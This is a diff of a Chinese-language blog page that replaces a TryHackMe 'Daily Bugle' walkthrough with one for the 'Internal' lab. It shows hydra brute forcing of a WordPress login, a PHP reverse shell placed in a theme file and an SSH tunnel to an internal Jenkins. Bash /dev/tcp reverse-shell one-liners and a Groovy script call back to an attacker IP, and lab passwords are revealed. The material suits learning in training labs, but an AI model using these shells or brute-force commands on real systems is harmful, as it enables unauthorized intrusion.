@@ -11,7 +11,7 @@
         name="viewport"
         content="width=device-width, initial-scale=1, maximum-scale=1"
       />
-      <title>thm-Daily Bugle |  sunset</title>
+      <title>thm-Internal |  sunset</title>
   <meta name="generator" content="hexo-theme-ayer">
       
       <link rel="shortcut icon" href="/favicon.ico" />
@@ -56,7 +56,7 @@
     <main class="content on">
       <section class="outer">
   <article
-  id="post-thm-Daily-Bugle"
+  id="post-thm-Internal"
   class="article article-type-post"
   itemscope
   itemprop="blogPost"
@@ -67,7 +67,7 @@
     <header class="article-header">
        
 <h1 class="article-title sea-center" style="border-left:0" itemprop="name">
-  thm-Daily Bugle
+  thm-Internal
 </h1>
  
 
@@ -75,8 +75,8 @@
     </header>
      
     <div class="article-meta">
-      <a href="/2024/07/28/thm-Daily-Bugle/" class="article-date">
-  <time datetime="2024-07-28T05:41:46.000Z" itemprop="datePublished">2024-07-28</time>
+      <a href="/2024/07/31/thm-Internal/" class="article-date">
+  <time datetime="2024-07-31T05:12:11.000Z" itemprop="datePublished">2024-07-31</time>
 </a> 
   <div class="article-category">
     <a class="article-category-link" href="/categories/thm/">thm</a>
@@ -87,7 +87,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-quill-pen-line"></i>
             <span class="post-meta-item-text"> Word count:</span>
-            <span class="post-count">416</span>
+            <span class="post-count">822</span>
         </span>
     </span>
 
@@ -96,7 +96,7 @@
         <span class="post-meta-item-icon">
             <i class="ri-book-open-line"></i>
             <span class="post-meta-item-text"> Reading time≈</span>
-            <span class="post-count">1 min</span>
+            <span class="post-count">3 min</span>
         </span>
     </span>
 </div>
@@ -111,51 +111,95 @@
   
     <div class="article-entry" itemprop="articleBody">
        
-  <h1 id="thm-Daily-Bugle-wp"><a href="#thm-Daily-Bugle-wp" class="headerlink" title="thm-Daily Bugle wp"></a>thm-Daily Bugle wp</h1><p>来到首页</p>
-<p><img src="https://sunsetdream.oss-cn-wuhan-lr.aliyuncs.com/img/image-20240728203532950.png" alt="image-20240728203532950"></p>
-<p>先拿一些信息，爆破一下网站目录</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster <span class="built_in">dir</span> --url http://10.10.249.254/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt</span><br></pre></td></tr></table></figure>
+  <h1 id="thm-Internal-wp"><a href="#thm-Internal-wp" class="headerlink" title="thm-Internal wp"></a>thm-Internal wp</h1><p>来到开始，就是一个apache的默认页面</p>
+<p><img src="https://sunsetdream.oss-cn-wuhan-lr.aliyuncs.com/img/image-20240731131447165.png" alt="image-20240731131447165"></p>
+<p>没什么头绪，先拿点信息</p>
+<p><img src="https://sunsetdream.oss-cn-wuhan-lr.aliyuncs.com/img/image-20240731131331411.png" alt="image-20240731131331411"></p>
+<p>发现没有什么服务能够被利用，爆破目录</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">/.hta (Status: 403)</span><br><span class="line">/.htaccess (Status: 403)</span><br><span class="line">/.htpasswd (Status: 403)</span><br><span class="line">/blog (Status: 301)</span><br><span class="line">/index.html (Status: 200)</span><br><span class="line">/javascript (Status: 301)</span><br><span class="line">/phpmyadmin (Status: 301)</span><br><span class="line">/server-status (Status: 403)</span><br><span class="line">/wordpress (Status: 301)</span><br></pre></td></tr></table></figure>
 
-<p><img src="https://sunsetdream.oss-cn-wuhan-lr.aliyuncs.com/img/image-20240728203833630.png" alt="image-20240728203833630"></p>
-<p>查看了一下有用的只有/administrator/，那么目前来说没有拿到什么有用的信息，尝试从历史漏洞突破</p>
-<p>找了半天没找到这个CMS的版本，最后直接搜索</p>
-<p><img src="https://sunsetdream.oss-cn-wuhan-lr.aliyuncs.com/img/image-20240728134458110.png" alt="image-20240728134458110"></p>
-<p>得到个路径</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/language/en-GB/en-GB.xml</span><br></pre></td></tr></table></figure>
+<p>来到/blog路由</p>
+<p><img src="https://sunsetdream.oss-cn-wuhan-lr.aliyuncs.com/img/image-20240801223002063.png" alt="image-20240801223002063"></p>
+<p>此处有一个文章点进去看，发现作者是admin</p>
+<p><img src="https://sunsetdream.oss-cn-wuhan-lr.aliyuncs.com/img/image-20240801223016394.png" alt="image-20240801223016394"></p>
+<p>从已有信息来看这个框架是WordPress，有专门对应的工具来扫描</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://internal.thm/blog -e u</span><br></pre></td></tr></table></figure>
 
-<p>得到版本3.7.0</p>
-<p><img src="https://sunsetdream.oss-cn-wuhan-lr.aliyuncs.com/img/image-20240728134556865.png" alt="image-20240728134556865"></p>
-<p>找到脚本<a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/44227">https://www.exploit-db.com/exploits/44227</a></p>
-<p><img src="https://sunsetdream.oss-cn-wuhan-lr.aliyuncs.com/img/image-20240728163044634.png" alt="image-20240728163044634"></p>
-<p>得到用户名为jonah</p>
-<p>得到密码的hash值，然后爆破得到密码</p>
-<p><img src="https://sunsetdream.oss-cn-wuhan-lr.aliyuncs.com/img/image-20240728162941108.png" alt="image-20240728162941108"></p>
-<p>得到密码为spiderman123</p>
-<p>然后登录站点，通过看每一个功能发现这个位置能够修改文件</p>
-<p><img src="https://sunsetdream.oss-cn-wuhan-lr.aliyuncs.com/img/image-20240728164525919.png" alt="image-20240728164525919"></p>
-<p>这里我选择了第一个</p>
-<p><img src="https://sunsetdream.oss-cn-wuhan-lr.aliyuncs.com/img/image-20240728164654298.png" alt="image-20240728164654298"></p>
-<p>随意选择一个文件去修改，我选择的是error.php</p>
-<p><img src="https://sunsetdream.oss-cn-wuhan-lr.aliyuncs.com/img/image-20240728164637044.png" alt="image-20240728164637044"></p>
-<p>修改后，在本地监听6666端口，然后访问 <a target="_blank" rel="noopener" href="http://10.10.146.205/templates/beez3/error.php">http://10.10.146.205/templates/beez3/error.php</a></p>
-<p>即可拿到shell</p>
-<p><img src="https://sunsetdream.oss-cn-wuhan-lr.aliyuncs.com/img/image-20240728164900249.png" alt="image-20240728164900249"></p>
-<p>发现我们拿到的是服务用户的shell，这导致我们的权限非常低</p>
-<p>来到home页面，发现有一个用户jjameson，但是很遗憾，无法进入该文件夹</p>
-<p><img src="https://sunsetdream.oss-cn-wuhan-lr.aliyuncs.com/img/image-20240728164938346.png" alt="image-20240728164938346"></p>
-<p>尝试其他的提权方式无果，来到/var/www/html目录，发现有个configuration.php</p>
-<p>泄露了重要信息，发现了数据库的用户和密码nv5uz9r3ZEDzVjNu</p>
-<p><img src="https://sunsetdream.oss-cn-wuhan-lr.aliyuncs.com/img/image-20240728165337793.png" alt="image-20240728165337793"></p>
-<p>尝试切换成root用户发现密码不正确，随后又尝试切换成jjameson，成功</p>
-<p>开始进一步提权</p>
-<p>查看sudo -l，看看有没有给我们设置命令</p>
-<p><img src="https://sunsetdream.oss-cn-wuhan-lr.aliyuncs.com/img/image-20240728163614202.png" alt="image-20240728163614202"></p>
-<p>发现有一个yum命令，通过该网站去查找提权方式</p>
-<p><a target="_blank" rel="noopener" href="https://gtfobins.github.io/">https://gtfobins.github.io/</a></p>
-<p><img src="https://sunsetdream.oss-cn-wuhan-lr.aliyuncs.com/img/image-20240728163742070.png" alt="image-20240728163742070"></p>
-<p>根据这个执行即可</p>
-<p>提权成功</p>
-<p><img src="https://sunsetdream.oss-cn-wuhan-lr.aliyuncs.com/img/image-20240728163521905.png" alt="image-20240728163521905"></p>
+<p>拿到了其版本信息</p>
+<p><img src="https://sunsetdream.oss-cn-wuhan-lr.aliyuncs.com/img/image-20240801223800487.png" alt="image-20240801223800487"></p>
+<p>但是没有可利用的漏洞</p>
+<p>拿到主题路径</p>
+<p><a target="_blank" rel="noopener" href="http://internal.thm/blog/wp-content/themes/twentyseventeen/">http://internal.thm/blog/wp-content/themes/twentyseventeen/</a></p>
+<p><img src="https://sunsetdream.oss-cn-wuhan-lr.aliyuncs.com/img/image-20240801223858154.png" alt="image-20240801223858154"></p>
+<p>并且枚举到admin用户名</p>
+<p><img src="https://sunsetdream.oss-cn-wuhan-lr.aliyuncs.com/img/image-20240801223950492.png" alt="image-20240801223950492"></p>
+<p>在网站下方，发现有登录链接</p>
+<p><img src="https://sunsetdream.oss-cn-wuhan-lr.aliyuncs.com/img/image-20240801224059033.png" alt="image-20240801224059033"></p>
+<p>有个登录框</p>
+<p><img src="https://sunsetdream.oss-cn-wuhan-lr.aliyuncs.com/img/image-20240801224115478.png" alt="image-20240801224115478"></p>
+<p>爆破拿到密码my2boys</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l admin -P rockyou.txt internal.thm http-post-form <span class="string">&quot;//blog/wp-login.php:log=^USER^&amp;pwd=^PASS^&amp;wp-submit=Log+In&amp;redirectadmin%2F&amp;testcookie=1:F=incorrect&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://sunsetdream.oss-cn-wuhan-lr.aliyuncs.com/img/image-20240731131506216.png" alt="image-20240731131506216"></p>
+<p>来到页面，通过审理功能发现此处可以修改php代码，再利用我们之前拿到的主题链接，可以访问这里的php代码</p>
+<p><a target="_blank" rel="noopener" href="http://internal.thm/blog/wp-content/themes/twentyseventeen/">http://internal.thm/blog/wp-content/themes/twentyseventeen/</a></p>
+<p><img src="https://sunsetdream.oss-cn-wuhan-lr.aliyuncs.com/img/image-20240801224215116.png" alt="image-20240801224215116"></p>
+<p>使用404页面，将php_reserve代码粘贴进去，修改ip和port</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php">https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php</a> </p>
+<p><img src="https://sunsetdream.oss-cn-wuhan-lr.aliyuncs.com/img/image-20240801224336738.png" alt="image-20240801224336738"></p>
+<p>保存后，本地起监听然后访问</p>
+<p><a target="_blank" rel="noopener" href="http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php">http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php</a></p>
+<p>拿到shell</p>
+<p><img src="https://sunsetdream.oss-cn-wuhan-lr.aliyuncs.com/img/image-20240801224504709.png" alt="image-20240801224504709"></p>
+<p>可以通过命令获取更稳定的shell</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">which python  <span class="comment">#在运行下面命令前，可以先执行此处看看有没有python环境</span></span><br><span class="line">python -c <span class="string">&quot;import pty ; pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#不过</span></span><br><span class="line">/<span class="built_in">bin</span>/bash -i <span class="comment">#好像也行</span></span><br></pre></td></tr></table></figure>
+
+<p>当前用户是www-data，来到home页面下，有一个用户aubreanna，我们接下来要突破的就是这个用户</p>
+<p><img src="https://sunsetdream.oss-cn-wuhan-lr.aliyuncs.com/img/image-20240801224651786.png" alt="image-20240801224651786"></p>
+<p>尝试许多提权方式无果后陷入僵局，最后通过不断查询发现/opt目录下有一个文件</p>
+<p><img src="https://sunsetdream.oss-cn-wuhan-lr.aliyuncs.com/img/image-20240801205021627.png" alt="image-20240801205021627"></p>
+<p>拿到了一个账号和密码 aubreanna:bubb13guM!@#123</p>
+<p>切换为aubreanna用户来到home目录</p>
+<p><img src="https://sunsetdream.oss-cn-wuhan-lr.aliyuncs.com/img/image-20240801205130033.png" alt="image-20240801205130033"></p>
+<p>拿到一个信息</p>
+<p><img src="https://sunsetdream.oss-cn-wuhan-lr.aliyuncs.com/img/image-20240801204933505.png" alt="image-20240801204933505"></p>
+<p>有个服务开在内网的172.17.0.2:8080 位置，无法从外部无法访问</p>
+<p>此时通过ssh反向代理将其8080端口流量转发到本地</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -f -N -L 4567:172.17.0.2:8080 aubreanna@internal.thm <span class="comment">#在自己的机器上使用</span></span><br></pre></td></tr></table></figure>
+
+<p>运行完后来到本地 localhost:4567 即可访问新网站</p>
+<p>浏览后发现一个登录框</p>
+<p><img src="https://sunsetdream.oss-cn-wuhan-lr.aliyuncs.com/img/image-20240801215614918.png" alt="image-20240801215614918"></p>
+<p>尝试爆破，拿到密码</p>
+<p><img src="https://sunsetdream.oss-cn-wuhan-lr.aliyuncs.com/img/image-20240801212007114.png" alt="image-20240801212007114"></p>
+<p>admin:spongebob</p>
+<p>登陆后通过审理功能发现漏洞点</p>
+<p><strong>方法一</strong></p>
+<p>创建一个新项目</p>
+<p><img src="https://sunsetdream.oss-cn-wuhan-lr.aliyuncs.com/img/image-20240801215816569.png" alt="image-20240801215816569"></p>
+<p>下面可以选择构建，其中可以执行Linux命令</p>
+<p><img src="https://sunsetdream.oss-cn-wuhan-lr.aliyuncs.com/img/image-20240801215904502.png" alt="image-20240801215904502"></p>
+<p>输入以下</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/bash -c <span class="string">&quot;/bin/bash -i &gt; /dev/tcp/10.11.68.215/6788 0&gt;&amp;1 2&lt;&amp;1&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>点击build now</p>
+<p><img src="https://sunsetdream.oss-cn-wuhan-lr.aliyuncs.com/img/image-20240801220014266.png" alt="image-20240801220014266"></p>
+<p>拿到shell</p>
+<p><img src="https://sunsetdream.oss-cn-wuhan-lr.aliyuncs.com/img/image-20240801220115817.png" alt="image-20240801220115817"></p>
+<p><strong>方法二</strong></p>
+<p>此处可以执行命令</p>
+<p><img src="https://sunsetdream.oss-cn-wuhan-lr.aliyuncs.com/img/image-20240801231411035.png" alt="image-20240801231411035"></p>
+<p>编写脚本</p>
+<p><img src="https://sunsetdream.oss-cn-wuhan-lr.aliyuncs.com/img/image-20240801231320656.png" alt="image-20240801231320656"></p>
+<p>脚本：</p>
+<figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> command = [<span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;/bin/bash -i &gt; /dev/tcp/10.11.68.215/6788 0&lt;&amp;1 2&gt;&amp;1&quot;</span>]</span><br><span class="line"><span class="keyword">def</span> process = command.execute()</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取命令输出</span></span><br><span class="line"><span class="keyword">def</span> outputStream = <span class="keyword">new</span> StringBuffer()</span><br><span class="line"><span class="keyword">def</span> errorStream = <span class="keyword">new</span> StringBuffer()</span><br><span class="line"></span><br><span class="line">process.consumeProcessOutput(outputStream, errorStream)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 等待命令执行完成</span></span><br><span class="line">process.waitFor()</span><br><span class="line"></span><br><span class="line">println <span class="string">&quot;Output: $&#123;outputStream&#125;&quot;</span></span><br><span class="line">println <span class="string">&quot;Errors: $&#123;errorStream&#125;&quot;</span></span><br><span class="line">println <span class="string">&quot;Exit code: $&#123;process.exitValue()&#125;&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>运行就能拿到shell</p>
+<p><strong>拿shell后</strong></p>
+<p>然后转到opt目录，拿到root:tr0ub13guM!@#123</p>
+<p><img src="https://sunsetdream.oss-cn-wuhan-lr.aliyuncs.com/img/image-20240801215441481.png" alt="image-20240801215441481"></p>
+<p>尝试在本机直接登录发现行不通，还是最开始拿到的shell处登录</p>
+<p><img src="https://sunsetdream.oss-cn-wuhan-lr.aliyuncs.com/img/image-20240801215536173.png" alt="image-20240801215536173"></p>
  
       <!-- reward -->
       
@@ -226,7 +270,7 @@
     <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
     <p>扫一扫，分享到微信</p>
     <div class="wx-qrcode">
-      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://example.com/2024/07/28/thm-Daily-Bugle/" alt="微信分享二维码">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://example.com/2024/07/31/thm-Internal/" alt="微信分享二维码">
     </div>
 </div>
 
@@ -237,19 +281,19 @@
    
   <nav class="article-nav">
     
-      <a href="/2024/07/30/thm-Relevant/" class="article-nav-link">
+      <a href="/2024/10/28/ezgadget/" class="article-nav-link">
         <strong class="article-nav-caption">上一篇</strong>
         <div class="article-nav-title">
           
-            thm-Relevant
+            ezgadget
           
         </div>
       </a>
     
     
-      <a href="/2024/07/27/thm-Skynet/" class="article-nav-link">
+      <a href="/2024/07/30/thm-Relevant/" class="article-nav-link">
         <strong class="article-nav-caption">下一篇</strong>
-        <div class="article-nav-title">thm-Skynet</div>
+        <div class="article-nav-title">thm-Relevant</div>
       </a>
     
   </nav>
